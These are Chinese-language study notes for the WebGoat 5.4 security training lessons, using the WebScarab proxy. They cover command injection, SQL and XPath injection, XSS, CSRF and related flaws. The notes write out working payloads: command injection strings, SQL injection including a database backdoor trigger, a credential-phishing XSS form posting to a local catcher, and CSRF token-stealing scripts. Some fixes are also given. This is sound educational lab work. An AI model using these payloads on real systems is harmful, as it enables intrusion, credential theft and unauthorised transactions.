# Webscrab

在Tools中选择Reveal Hidden FIelds和Use full-featured interface，**重启后才能生效**。

默认监听的端口号为8008.可以**在Proxy中进行修改**，不过首先需要选中，点击旁边的stop停止监听。修改为9999，修改后**可以在Messages一栏中查看运行日志**。不过需要对应在**控制面板(-网络和internet-网络和共享中心)-internet选项-连接-局域网设置-代理服务器**中设置系统代理，即为LAN使用代理服务器修改端口号为9999。**注意需要取消对于本地地址不使用代理服务器的√**。

修改完成后，就能发现原来是Listener.run，现在变成了Listener.listen

~~~
参考下面的进行了配置
https://www.jianshu.com/p/0097d27a269e
webscrab
https://blog.csdn.net/ssdsafsdsd/article/details/40594261
https://cloud.tencent.com/developer/article/1123547
~~~

在浏览器的URL一栏中输入地址，就会跳出Edit Response界面，在这个界面中，可以进行修改。做出修改后，**单击Accept changes就可以将修改后的内容发送到服务器上**。如果Cancel changes，就会发送原始的请求。如果根本不想给服务器发送一个请求，可以选择Abort request，向浏览器返回一个错误。如果打开了多个拦截窗口，可以使用Cancel ALL intercepts释放所有的请求。**如果在Proxy-Manual Edit中取消勾选Intercept request就不会进行拦截了**。在Manual Edit中有Exclude paths matching，后面跟的是正则表达式，用于匹配请求的URL，如果匹配，请求就不会被拦截。

可以试试使用**IE浏览器**打开Webgoat界面。



# 1. Injection Flaws

命令注入攻击对于任何参数驱动(parameter-driven site)的网站都是一个威胁。

## 1.1 Command Injection

基本的身份验证(Authentication)用于保护服务端(server side)的资源。浏览器将以base64编码用户名和密码，并将这些凭据(credentials)发送回web服务器。

截取后在末尾添加

~~~
" & netstat -an & config
ampersand(&)分隔了windows中的命令，在unix中则是;
引号是因为服务器可能会用引号将内容括起来
~~~

因为原来是执行

~~~
页面提示的是
ExecResults for 'cmd.exe /c type "E:\safe\WebGoat-5.4\tomcat\webapps\WebGoat\lesson_plans\English\AccessControlMatrix.html"'
执行的内容是单引号的部分，即
cmd.exe /c type "E:\safe\WebGoat-5.4\tomcat\webapps\WebGoat\lesson_plans\English\AccessControlMatrix.html"

添加后就执行
cmd.exe /c type "E:\safe\WebGoat-5.4\tomcat\webapps\WebGoat\lesson_plans\English\AccessControlMatrix.html" & netstat -an & ipconfig
最终获得网络信息
~~~

## 1.2 Numeric SQL Injection

Numeric-数值型

实际上是通过数值带入SQL语句。

由于是数值型的SQL语句，在SQL语句中增加 or 1=1，就能过跳过筛选，获取全部的内容。



## 1.3 Log Spoofing

log spoofing-日志欺骗

在输入的用户名称中smith修改为

~~~
smith%0d%0alogin succeeded for the username: smith

会显示
Login failed for username: admin
login succeeded for the username: smith

因为%0d%0a是换行的意思。%0d代表CR，%0a代表LF

Smith%0d%0aLogin Succeeded for username: admin<script>alert(document.cookie)</script>
~~~



## 1.4 XPATH Injection

XPath Injection类似SQL注入。

不过XPATH的数据是按XML格式存储的。

~~~xquery
XPath query

String dir = s.getContext().getRealPath("/lessons/XPATHInjection/EmployeesData.xml");
File d = new File(dir);
XPathFactory factory = XPathFactory.newInstance();
XPath xPath = factory.newXPath();
InputSource inputSource = new InputSource(new FileInputStream(d));
String expression = "/employees/employee[loginID/text()='" + username + "' and passwd/text()='" + password + "']";
nodes = (NodeList) xPath.evaluate(expression, inputSource, XPathConstants.NODESET);
~~~

但是是需要用到字符串的引号.

~~~xquery
Mike' or 1=1 or 'a'='a

服务器的解释方法是
expression = "/employees/employee[ ( loginID/text()='Smith' or 1=1 ) OR ( 'a'='a' and passwd/text()='password' ) ]"
~~~



## 1.5 String SQL Injection

输入字符的SQL注入，因为是获取字符，所以可以在之前数字的前提下增加引号。

~~~sql
//输入为Erwon的情况
SELECT * FROM user_data WHERE last_name = 'Erwon' 

//输入为Erwon，拦截后增加' or '1'='1
SELECT * FROM user_data WHERE last_name = 'Erwon' or '1'='1'

~~~



## 1.6 LAB: SQL Injcetion

### stage1

~~~sql
"SELECT * FROM employee WHERE userid = " + userId + " and password = " + password
~~~

但是这里有长度限制，需要使用webscarab进行移除。

~~~sql
"SELECT * FROM employee WHERE userid = " + userId + " and password = " + password

方法同上
增加' or '1'='1
~~~

### stage2

只对开发者版本有效，所以不用做。

Parametreized Queries-参数化查询

~~~java
//原来的语句:String query = "SELECT * FROM employee WHERE userid = " + userId + " and password = '" + password + "'";
String query = "SELECT * FROM employee WHERE userid = ? and password = ?";

try
{
  Connection connection = WebSession.getConnections(s);
  PreparedStatement statement = connection.prepareStatement(query, ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY);
  statement.setString(1, userId);
  statement.setString(2, password);
  ResultSet answer_results = statement.executeQuery();
  etc...
}      
~~~

### stage3

从员工Larry处获取boss的信息。

这里需要社会上的知识：老板的工资是最高的。

~~~
先在密码处输入
s' or '1'='1

再于viewfile输入(老板工资最高)
101 or 1=1 order by salary desc
~~~

虽然hi得到全部员工的信息，但是只会返回一条信息。

### stage4

开发者版本，修复

~~~java
package org.owasp.webgoat.lessons.SQLInjection;

//在getREmployeeProfile下增加
String query = "SELECT employee.* "
    + "FROM employee,ownership WHERE employee.userid = ownership.employee_id and "
    + "ownership.employer_id = ? and ownership.employee_id = ?";
try
{
  Connection connection = WebSession.getConnections(s);
  PreparedStatement statement = connection.prepareStatement(query, ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY);
  statement.setString(1, userId);
  statement.setString(2, subjectUserId);
  ResultSet answer_results = statement.executeQuery();
  etc...
~~~



## 1.7 Modify Data with SQL Injection

可以使用SQL注入修改数据。只需要使用;(semicolon)

~~~sql
jsmith';UPDATE salaries SET salary=99999 WHERE userid='jsmith'--这是评论
~~~



## 1.8 ADD Data with SQL Injection

通过分隔符(semicolon ;)使用多个语句。使用INSERT语句。

~~~sql
bar';INSERT INTO salaries VALUES('goa',99999);--插入用户名为goa，薪资为99999的一条记录
~~~



## 1.9 Database Backdoors

使用SQL注入实现大于一条的SQL语句。

~~~sql
首先是输入userid，然后修改salary
101;UPDATE employee SET salary=99999

然后是添加触发器
101;CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='join@hackme.com'WHERE userid = NEW.userid
~~~



## 1.10 Blind Numeric SQL Injection

先输入101，发现合法。

通过101 AND 1=1 和101 AND 1=2的原理进行判断，二分最终得到最后的值。

~~~sql
101 AND ((SELECT pin FROM pins WHERE cc_number='1111222233334444')<10000) #这里是整数范围

首先会返回Account number is valid.
然后根据规则缩小参数的范围
修改10000的值为5000，进行二分，当小于1250时会显示
Invalid account number
~~~



## 1.11 Blind String SQL Injection

~~~sql
需要使用SUBSTRING(STRING, START,LENGTH)

101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 1, 1) < 'H' );

这样子能够找到第一个字符为J，依次找下去，找到了Jill
~~~





# 2. XSS

通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序

The user should be able to add a form asking for username and password. On submit the input should be sent to http://localhost/WebGoat/catcher?PROPERTY=yes&user=catchedUserName&password=catchedPasswordName

使用XSS能够在已经存在的页面上增加额外的元素。



## 2.1 Phishing with XSS

用XSS钓鱼，主要是使用XSS和HTML插入

* 插入HTML需要身份验证的信息
* 增加JavaScript来收集这些信息
* 将这些信息post

在search中输入增加用户名和密码的表格。格式如下

br代表空的标签，用于换行。hr是水平线分隔符，在视觉上将文档分块。

~~~html
</form><form name="phish"><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br></form><br><br><HR>
~~~

然后添加JavaScript，这个js能够读取从表单输入的信息，并将信息发送给webgoat

~~~javascript
<script>function hack(){ XSSImage=new Image; XSSImage.src="http://localhost/WebGoat/catcher?PROPERTY=yes&user="+ document.phish.user.value + "&password=" + document.phish.pass.value + ""; alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + "Password = " + document.phish.pass.value);} </script>
~~~

然后需要一个按钮

type规定的是按钮的类型，name定义的是按钮的名称，value是input元素的值，

~~~html
<input type="submit" name="login" value="login" onclick="hack()">
~~~

最终的结果如下所示，也就是将JavaScript的内容放在form的开头，button的内容放在末尾。

~~~html
</form><script>function hack(){ XSSImage=new Image; XSSImage.src="http://localhost/WebGoat/catcher?PROPERTY=yes&user="+ document.phish.user.value + "&password=" + document.phish.pass.value + ""; alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + "Password = " + document.phish.pass.value);} </script><form name="phish"><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>
~~~



## 2.2 Lab:Cross Site Scripting



### stage1

先登录Tom的账户，选择editProfile，在street栏中输入

~~~html
<script>Alert('Got ya')</script>
~~~

再用另一账户，权限要高一些的，登录，查看Tom的账户，就会跳出这个alert。

### stage2

需要修改java代码

类名称为UpdateProfile.java，路径为org.owasp.webgoat.lessons.CrossSiteScripting。修改的源代码如下

~~~java
String regex = "[\\s\\w-,]*";
String stringToValidate = firstName+lastName+ssn+title+phone+address1+address2+startDate+ccn+disciplinaryActionDate+disciplinaryActionNotes+personalDescription;
Pattern pattern = Pattern.compile(regex);
validate(stringToValidate, pattern);
~~~

\s匹配任何不可见字符，包括空格、制表符、换页符等。

\w匹配包含下划线的任何单词字符。

### stage3

题目要求的是执行预先设置好的xss。就先登录管理员的账号，然后访问预先设置XSS的账号。



### stage4

开发者版本

路径为org.owasp.webgoat.util.HtmlEncoder



### stage5 

执行reflected XSS 攻击(反射跨站脚本攻击)

利用search栏的漏洞创建一个包含危险攻击的URL，证实别的用户会被影响。

在SearchStaff中输入

~~~html
<script>alert("Dangerous");</script>
~~~



### stage6

使用输入验证的方式拦截Reflected XSS

编辑org.owasp.webgoat.lessons.CrossSiteScripting.FindProfile.java。修改getRequstParameter方法。

~~~java
String regex = "[\\s\\w-,]*";
String parameter = s.getParser().getRawParameter(name);
Pattern pattern = Pattern.compile(regex);
validate(parameter, pattern);
		
return parameter;
~~~



## 2.3 Stored XSS Attack

**清除所有输入，尤其是可能会输入到OS命令行、脚本以及数据库的输入**。如果是要输入到数据库并且被永久存储的内容，这一点尤其重要。

增加信息，信息能够使别的用户加载一个不受欢迎的页面。

在Message栏中写入

~~~html
<script language="javascript" type="text/javascript">alert("Ha Ha Ha");</script>
~~~

若是返回cookie值。

~~~html
<script language="javascript" type="text/javascript">
    document.cookie = "name=oeschger";
document.cookie = "favorite_food=tripe";alert(document.cookie);</script>
~~~

~~~html
document.cookie = newCookie;
newCookie是一个以键值对形式的字符串。用这个方法一次只能对一个cookie进行更新。
~~~

常用的cookie属性值

* ;path=*path* (例如 '/', '/mydir') 如果没有定义，默认为当前文档位置的路径。

* ;domain=*domain* (例如 'example.com'， 'subdomain.example.com') 如果没有定义，默认为当前文档位置的路径的域名部分。与早期规范相反的是，在域名前面加 . 符将会被忽视，因为浏览器也许会拒绝设置这样的cookie。如果指定了一个域，那么子域也包含在内。

* ;max-age=*max-age-in-seconds* (例如一年为60*60*24*365)

* 
  ;expires=date-in-GMTString-format
  

   如果没有定义，cookie会在对话结束时过期

  - 这个值的格式参见[Date.toUTCString()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/toUTCString) 

* ;secure (cookie只通过https协议传输)

## 2.4 Reflected XSS Attack

简单的做法是

在某一栏中输入

~~~html
 <script>alert('Bang!')</script>
or
<script>alert(document.cookie);</script>
~~~

如果要获得信用卡的字段

~~~html
<script type="text/javascript">if ( navigator.appName.indexOf("Microsoft") !=-1){var xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");xmlHttp.open("TRACE", "./", false); xmlHttp.send();str1=xmlHttp.responseText; while (str1.indexOf("\n") > -1) str1 = str1.replace("\n","<br>"); document.write(str1);}</script>");
~~~



## 2.5 Cross Site Request Forgery

CSRF，跨站请求伪造，挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。

在title中命名为test，但是message中需要插入一段图片的html代码

~~~html
<img src="http://localhostattack?Screen=52&menu=900&transferFunds=5000" width="1" height="1" />
~~~

注意SRC的内容要根据具体的来



## 2.6 CSRF Prompt By-Pass

在message框中输入

~~~html
<img src="?transferFunds=4000" />
<img src="?transferFunds=CONFIRM" />
~~~

点击提交，刷新后就可以看到已经完成实验了。好像不对



直接的办法

在URL中输入&transferFunds=4000，就会跳转到另一个界面。

查看源代码，寻找confirm需要的参数

~~~html
<form accept-charset='UNKNOWN' method='POST' action='attack?Screen=5&menu=900' enctype='application/x-www-form-urlencoded'>
	<input name='transferFunds' type='submit' value='CONFIRM'>
	<input name='transferFunds' type='submit' value='CANCEL'>
</form>
~~~

点击CONFIRM。



获取了confirm的信息。

需要使用此解决方案展示了如何使用 iframe 和图像进行这种攻击。 下一步是添加额外的伪造确认请求。 但是，带有此 URL 的附加 iframe 或图像是不够的。 第二个请求必须在第一个请求之后加载。 所以**添加 Javascript 来加载第一个命令之后的第二个命令**。 对于 iframe，让第一帧的 onload 属性设置第二个 iframe 的 src：

接下来将 iframe 添加到存储在网页上的消息中

~~~html
<iframe
	src="http://localhost:8080/WebGoat/attack?Screen=5&menu=900&transferFunds=400"
	id="myFrame" frameborder="1" marginwidth="0"
	marginheight="0" width="800" scrolling=yes height="300"
	onload="document.getElementById('frame2').src='http://localhost:8080/WebGoat/attack?Screen=5&menu=900&transferFunds=CONFIRM';">
</iframe>
	
<iframe
	id="frame2" frameborder="1" marginwidth="0"
	marginheight="0" width="800" scrolling=yes height="300">
</iframe>
~~~



## 2.7 CSRF Token By-Pass

首先需要在浏览器的URL栏中输入&transferFunds=main，就会跳转到另一个界面了，输入金额，点击提交。(这里其实就能完成实验了)

然后查看页面的代码找到Token的位置

~~~html
<form accept-charset='UNKNOWN' id='transferForm' method='POST' action='attack?Screen=2&menu=900' enctype='application/x-www-form-urlencoded'>
	<input name='transferFunds' type='text' value='0'>
	<input name='CSRFToken' type='hidden' value='1745740650'>
	<input type='submit'>
</form>
~~~

从上面的代码可以看出需要打造出CSRFToken这个命令。

回到首页，forge the request(打造请求)

此解决方案在 iframe 中加载此页面并从框架中读取令牌。 请注意，这是可能的，因为消息来自同一域并且不违反“同源策略”。 所以即使认为这个页面已经采取了防止 CSRF 攻击的措施，这些措施也可以因为 CSS 漏洞而被回避。 拉出CSRFToken，下面的javascript先定位frame，再定位form，然后保存token

~~~javascript
var tokenvalue;

function readFrame1()
{
    var frameDoc = document.getElementById("frame1").contentDocument;
    var form = frameDoc.getElementsByTagName("form")[1];
    var token = form.CSRFToken.value;
    tokenvalue = '&CSRFToken='+token;
    
    loadFrame2();
}

function loadFrame2()
{
    var testFrame = document.getElementById("frame2");
    testFrame.src="http://localhost:8080/WebGoat/attack?Screen=212&menu=900&transferFunds=4000"+tokenvalue;	
}
~~~



## 2.8 HTTPOnly Test

HTTP only是包含在HTTP返回头Set-Cookie中的一个附加的flag。有助于减轻客户端脚本访问受保护cookie的风险。

~~~http
Set-Cookie: <name>=<value>[; <Max-Age>=<age>]
[; expires=<date>][; domain=<domain_name>]
[; path=<some_path>][; secure][; HttpOnly]
~~~

如果HTTP响应标头中**包含HttpOnly标志（可选），客户端脚本将无法访问cookie**（如果浏览器支持该标志的话）。因此即使客户端存在跨站点脚本（XSS）漏洞，**浏览器也不会将Cookie透露给第三方**。

如果浏览器不支持HttpOnly，并且后端服务器尝试设置HttpOnly cookie，浏览器也会忽略HttpOnly标志，从而创建传统的，脚本可访问的cookie。那么该cookie（通常是会话cookie）容易受到XSS攻击.

~~~java
Cookie cookie = getMyCookie("myCookieName");
cookie.setHttpOnly(true);
~~~

~~~xml
<session-config>
<cookie-config>
  <http-only>true</http-only>
</cookie-config>
</session-config>

作者：牧羊人刘俏
~~~

检测浏览器是否支持HTTPOnly cookie

turn on HTTPOnly,就会拦截XSS攻击。否则选择readcookie，就会跳出unique2u的内容

主要看实验报告中的四张图



## 2.9 Cross Site Tracing(XST) Attacks

通过插入

~~~html
<script type="text/javascript">
    if ( navigator.appName.indexOf("Microsoft") !=-1) 
    {var xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
     xmlHttp.open("TRACE", "./", false); 
     xmlHttp.send();
     str1=xmlHttp.responseText; 
     while (str1.indexOf("\n") > -1) str1 = str1.replace("\n","<br>"); 
     document.write(str1);}
</script>
~~~



# 3. DoS

DOS，Denial Of Service

hints

需要使用SQL注入来获得用户名

需要生成这样的查询语句

~~~sql
SELECT * FROM user_system_data WHERE user_name = 'goober' and password = 'dont_care' or '1' = '1'
~~~

然后用3个账号登录就能完成了。

# 4. Concurrency

## 4.1 Thread safety Problem

线程反应的时间较长。在一个界面输入dave，在另一浏览器界面输入jeff。按下一个浏览器的submit，在浏览器响应的时间内迅速按下另一个浏览器的submit，此时就会返回同一个值。返回的是后一个变量的值。

## 4.2 shopping cart concurrency flaw

类似



# 5. Code Quality

右键点击查看源代码

<!--TODO-->表示有功能代码需要编写

<!--FIXME-->标识处代码需要修正

<!--XXX-->实现方法有待商榷



# 6. Improper Error Handling

由于错误的设置，可以在webscarab中把密码字段移除。



# 7.Insecure Configuration

目标：尽管不是维护人员，却能够强制浏览页面的config界面

如果想要访问一个受限制的网页，可以**猜测URI来访问界面，比如使用admin**。因为这里是localhost/WebGoat/attack，所有URI是localhost/WebGoat/

对于configuration，可以试试config、configuration、conf



# 8. Buffer Overflows

